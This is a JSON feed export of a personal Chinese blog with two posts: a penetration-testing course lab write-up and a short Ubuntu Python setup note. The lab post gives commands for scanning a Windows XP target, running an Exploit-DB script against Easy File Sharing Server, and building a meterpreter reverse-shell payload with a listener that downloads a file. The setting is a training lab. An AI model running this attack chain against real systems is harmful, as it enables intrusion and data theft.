{
    "version": "https://jsonfeed.org/version/1",
    "title": "null • All posts by \"python\" tag",
    "description": "夜深忽夢少年事",
    "home_page_url": "http://meviv.github.io",
    "items": [
        {
            "id": "http://meviv.github.io/2022/11/05/%E6%B8%97%E9%80%8F/rearch/",
            "url": "http://meviv.github.io/2022/11/05/%E6%B8%97%E9%80%8F/rearch/",
            "title": "渗透课程复现任务",
            "date_published": "2022-11-05T07:16:53.000Z",
            "content_html": "<p>实验课复现内容</p>\n<span id=\"more\"></span>\n<h1 id=\"漏洞渗透测试\"><a class=\"markdownIt-Anchor\" href=\"#漏洞渗透测试\">#</a> 漏洞渗透测试</h1>\n<p>1、靶机 (Windows) 安装 easy file sharing server（efssetup_2018.zip)，该服务存在漏洞。<br>\n2、利用 Nmap 扫描发现靶机 (Windows) 运行了该服务。P99-100<br>\n3、利用该漏洞，使得靶机运行计算器。P116-119</p>\n<h2 id=\"环境搭建\"><a class=\"markdownIt-Anchor\" href=\"#环境搭建\">#</a> 环境搭建</h2>\n<p>靶机：WinXP<br>\n 开启 easy file sharing 服务<br>\n攻击机：kali2022<br>\n 两机位于同一网段内，需要相互 ping 通<br>\n (如遇无法 ping 通的情况，可关闭 winXP 的防火墙)</p>\n<h2 id=\"渗透过程\"><a class=\"markdownIt-Anchor\" href=\"#渗透过程\">#</a> 渗透过程</h2>\n<p>打开 kail 攻击机，扫描同一子网下主机</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>arp-scan -l</pre></td></tr></table></figure><p><img data-src=\"https://s2.loli.net/2024/03/03/kyfeZWAcDClt7Og.png\" alt=\"\"><br>\n对靶机进行进一步扫描，查看端口开放情况</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nmap -sV -A 192.168.232.132</pre></td></tr></table></figure><p><img data-src=\"https://s2.loli.net/2024/03/03/6dDt39hjCwLPJfl.png\" alt=\"\"><br>\n知道了靶机开放端口服务<br>\n使用 searchsploit</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>searchsploit easy file sharing</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>searchsploit -m 39009</pre></td></tr></table></figure><p><img data-src=\"https://s2.loli.net/2024/03/03/prgVy57shOe3oMY.png\" alt=\"\"><br>\n运行脚本 python2+path+ip+port</p>\n<div class=\"note info\">\n<p>由于脚本输出没有使用严格括号，需要声明 py2 运行</p>\n</div>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python2 &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;windows&#x2F;remote&#x2F;39009.py 192.168.232.132 80</pre></td></tr></table></figure><p><img data-src=\"https://s2.loli.net/2024/03/03/MyF89d2gtNxezKP.png\" alt=\"\"><br>\nDone 表示脚本执行完成，打开靶机发现计算器已弹出<br>\n<img data-src=\"https://s2.loli.net/2024/03/03/a7M2eJcA9GjdtPu.png\" alt=\"\"><br>\n至此完成渗透</p>\n<h1 id=\"metasploit应用\"><a class=\"markdownIt-Anchor\" href=\"#metasploit应用\">#</a> Metasploit 应用</h1>\n<p>1、生成主控端、被控端。<br>\n2、获得靶机 (Windows) 控制权。<br>\n3、下载靶机上任意一个文件。P121-123;140-145</p>\n<h2 id=\"环境搭建-2\"><a class=\"markdownIt-Anchor\" href=\"#环境搭建-2\">#</a> 环境搭建</h2>\n<p>靶机：winXP (192.168.232.132)<br>\n 攻击机：kali (192.168.232.130)<br>\n 注意两机位于同一网段内</p>\n<h2 id=\"渗透过程-2\"><a class=\"markdownIt-Anchor\" href=\"#渗透过程-2\">#</a> 渗透过程</h2>\n<p>生成被控端，在 kali 以 root 账户执行</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.232.130 lport&#x3D;5000 -f exe -o &#x2F;root&#x2F;payload.exe</pre></td></tr></table></figure><p>生成 payload.exe 后传到靶机<br>\n<img data-src=\"https://s2.loli.net/2024/03/03/tjB1SODFIaJwbL4.png\" alt=\"\"><br>\n生成主控端<br>\n再次以 root 账户执行</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>msfconsole</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>use exploit&#x2F;multi&#x2F;handler</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>set lhost 192.168.232.130</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>set lport 5000</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>exploit</pre></td></tr></table></figure><p><img data-src=\"https://s2.loli.net/2024/03/03/uJWlGteOmF1LRq2.png\" alt=\"\"><br>\n此时，将生成的 payload.exe 程序复制到靶机上运行<br>\n成功获取权限<br>\n执行 ls 查看需要的文件。输入 dowload log.txt 下载文件<br>\n<img data-src=\"https://s2.loli.net/2024/03/03/GWOfaeihJVTzMd5.png\" alt=\"\"><br>\n成功下载文件<br>\n<img data-src=\"https://s2.loli.net/2024/03/03/oOlyiVNQ6uqEtsn.png\" alt=\"\"></p>\n",
            "tags": [
                "Python",
                "渗透"
            ]
        },
        {
            "id": "http://meviv.github.io/2022/06/04/Python/ubuntu%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AEpython/",
            "url": "http://meviv.github.io/2022/06/04/Python/ubuntu%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AEpython/",
            "title": "ubuntu系统配置python",
            "date_published": "2022-06-04T05:41:40.000Z",
            "content_html": "<p>为 ubuntu 服务器配置 py 环境用于运行代码.</p>\n<span id=\"more\"></span>\n<h1 id=\"环境配置\"><a class=\"markdownIt-Anchor\" href=\"#环境配置\">#</a> 环境配置</h1>\n<p>为 ubuntu 服务器配置 py 环境用于运行代码.<br>\n 所用系统镜像为 Ubuntu20.04</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>sudo apt install python3.10-dev</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>sudo apt install python3.10-distutils</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>sudo apt install python3.10-venv</pre></td></tr></table></figure><div class=\"note warning\">\n<p>注意</p>\n</div>\n<p>通过此种方法配置的 Python 会缺少 pip 包，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS13ZWd0Z2V0LXBpcC15ejU1YXl6ZTc4OGE3eHoucHk=\">需要 wegt 装载 get-pip.py</span>.<br>\n 再次运行即可</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>wget https:&#x2F;&#x2F;bootstrap.pypa.io&#x2F;get-pip.py</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>python3.10 get-pip.py</pre></td></tr></table></figure>",
            "tags": [
                "Ubuntu",
                "Python"
            ]
        }
    ]
}